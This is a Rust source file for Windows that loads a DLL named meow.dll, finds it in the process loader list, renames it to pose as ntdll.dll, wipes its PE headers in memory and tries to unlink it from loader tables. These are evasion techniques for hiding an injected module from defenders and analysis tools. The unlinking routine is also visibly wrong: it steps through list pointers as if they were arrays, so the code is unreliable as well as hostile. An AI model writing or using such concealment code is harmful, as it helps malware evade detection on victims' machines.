#![allow(non_snake_case)]

use std::ffi::{OsStr, OsString};
use std::os::windows::ffi::{OsStrExt, OsStringExt};
use std::slice;
use std::iter::once;
use std::io::{self, Write};
use winapi::shared::ntdef::{LIST_ENTRY};
use ntapi::ntpebteb::PEB;
use ntapi::ntldr::{LDR_DATA_TABLE_ENTRY};
use ntapi::winapi_local::um::winnt::__readgsqword;
use ntapi::ntpsapi::PEB_LDR_DATA;
use winapi::um::libloaderapi::LoadLibraryW;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::winnt::PAGE_READWRITE;
use std::ptr;

struct ModuleRenamer;

impl ModuleRenamer {
    unsafe fn change_module_name(sz_module: &str, new_name: &str) -> Result<(), String> {
        let sz_module_wide = Self::to_wide_string(sz_module);
        let new_name_wide = Self::to_wide_string(new_name);

        let peb = __readgsqword(0x60) as *mut PEB;
        if peb.is_null() {
            return Err("Failed to get PEB.".into());
        }

        let ldr = (*peb).Ldr as *mut PEB_LDR_DATA;
        if ldr.is_null() {
            return Err("Failed to get LDR.".into());
        }

        let mut f = (*ldr).InMemoryOrderModuleList.Flink;

        while f != &mut (*ldr).InMemoryOrderModuleList as *mut LIST_ENTRY {
            let data_entry = (f as usize - offset_of!(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)) as *mut LDR_DATA_TABLE_ENTRY;

            if !data_entry.is_null() {
                let full_dll_name = &(*data_entry).FullDllName;
                let full_dll_name_str = slice::from_raw_parts(full_dll_name.Buffer, full_dll_name.Length as usize / 2);
                let original_name = Self::wide_to_string(full_dll_name_str);

                if Self::wcsstr(full_dll_name.Buffer, sz_module_wide.as_ptr()).is_some() {
                    Self::wcscpy((*data_entry).FullDllName.Buffer, new_name_wide.as_ptr());
                    let new_name_str = Self::wide_to_string(slice::from_raw_parts(new_name_wide.as_ptr(), new_name_wide.len() - 1));
                    println!("Renamed module: {} to {}", original_name, new_name_str);
                    Self::erase_pe_header_and_section_headers((*data_entry).DllBase as *mut u8);
                    Self::remove_from_ldr_tables(data_entry);
                }
            }

            f = (*f).Flink;
        }

        Ok(())
    }

    unsafe fn erase_pe_header_and_section_headers(base_address: *mut u8) {
        let dos_header = base_address as *mut winapi::um::winnt::IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != 0x5A4D { // Check for 'MZ' magic number
            return;
        }

        let nt_headers = (base_address.add((*dos_header).e_lfanew as usize)) as *mut winapi::um::winnt::IMAGE_NT_HEADERS;
        if (*nt_headers).Signature != 0x4550 { // Check for 'PE\0\0' signature
            return;
        }

        let size_of_headers = (*nt_headers).OptionalHeader.SizeOfHeaders as usize;

        let mut old_protect = 0;
        if VirtualProtect(base_address as *mut _, size_of_headers, PAGE_READWRITE, &mut old_protect) == 0 {
            eprintln!("Failed to change memory protection. Error: {}", GetLastError());
            return;
        }

        ptr::write_bytes(base_address, 0, size_of_headers);

        if VirtualProtect(base_address as *mut _, size_of_headers, old_protect, &mut old_protect) == 0 {
            eprintln!("Failed to restore memory protection. Error: {}", GetLastError());
        }
    }


    unsafe fn remove_from_ldr_tables(data_entry: *mut LDR_DATA_TABLE_ENTRY) {
        let peb = __readgsqword(0x60) as *mut PEB;
        if peb.is_null() {
            eprintln!("Failed to get PEB.");
            return;
        }

        let ldr = (*peb).Ldr as *mut PEB_LDR_DATA;
        if ldr.is_null() {
            eprintln!("Failed to get LDR.");
            return;
        }

        // Assume these are pointers to the relevant structures
        let ldrp_hash_table: *mut LIST_ENTRY = (*ldr).InMemoryOrderModuleList.Flink;
        let ldrp_module_base_address_index: *mut LIST_ENTRY = (*ldr).InMemoryOrderModuleList.Blink;

        // Remove from LdrpHashTable
        let mut f = ldrp_hash_table;
        while f != ldrp_hash_table.add(32) {
            if (f as *mut LDR_DATA_TABLE_ENTRY) == data_entry {
                (*(*f).Blink).Flink = (*f).Flink;
                (*(*f).Flink).Blink = (*f).Blink;
                break;
            }
            f = f.add(1);
        }

        // Remove from LdrpModuleBaseAddressIndex
        f = ldrp_module_base_address_index;
        while f != ldrp_module_base_address_index.add(32) {
            if (f as *mut LDR_DATA_TABLE_ENTRY) == data_entry {
                (*(*f).Blink).Flink = (*f).Flink;
                (*(*f).Flink).Blink = (*f).Blink;
                break;
            }
            f = f.add(1);
        }
    }

    fn to_wide_string(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(once(0)).collect()
    }

    fn wide_to_string(wide: &[u16]) -> String {
        OsString::from_wide(wide).to_string_lossy().into_owned()
    }

    unsafe fn wcslen(s: *const u16) -> usize {
        let mut len = 0;
        while *s.offset(len as isize) != 0 {
            len += 1;
        }
        len
    }

    unsafe fn wcscpy(dst: *mut u16, src: *const u16) {
        let mut i = 0;
        while *src.offset(i) != 0 {
            *dst.offset(i) = *src.offset(i);
            i += 1;
        }
        *dst.offset(i) = 0;
    }

    unsafe fn wcsstr(haystack: *const u16, needle: *const u16) -> Option<*const u16> {
        let mut h = haystack;
        let n_len = Self::wcslen(needle);

        while *h != 0 {
            if Self::wcsncmp(h, needle, n_len) == 0 {
                return Some(h);
            }
            h = h.offset(1);
        }
        None
    }

    unsafe fn wcsncmp(s1: *const u16, s2: *const u16, n: usize) -> i32 {
        for i in 0..n {
            let c1 = *s1.offset(i as isize);
            let c2 = *s2.offset(i as isize);
            if c1 != c2 {
                return c1 as i32 - c2 as i32;
            }
        }
        0
    }
}


fn run() -> Result<(), String> {
    unsafe {
        // Load the DLL from the UNC path into the current process without initializing it
        let dll_name = ModuleRenamer::to_wide_string(r"C:\Users\L.Ackerman\Desktop\meow.dll");
        let hDll = LoadLibraryW(dll_name.as_ptr());

        if hDll.is_null() {
            return Err(format!("Failed to load DLL. Error: {}", GetLastError()));
        }
        ModuleRenamer::change_module_name("meow.dll", "\\\\localhost\\C$\\Windows\\System32\\ntdll.dll")?;
        
    }

    Ok(())
}

#[macro_export]
macro_rules! offset_of {
    ($ty:ty, $field:ident) => {{
        let dummy = std::mem::MaybeUninit::<$ty>::uninit();
        let dummy_ptr = dummy.as_ptr();
        unsafe { (&(*dummy_ptr).$field as *const _ as usize) - (dummy_ptr as usize) }
    }};
}

fn main() -> Result<(), String> {
    if let Err(e) = run() {
        eprintln!("Error: {}", e);
    }

    // Mimic system("pause") using stdin
    print!("Press Enter to continue...");
    io::stdout().flush().map_err(|e| e.to_string())?;
    let _ = io::stdin().read_line(&mut String::new()).map_err(|e| e.to_string())?;
    Ok(())
}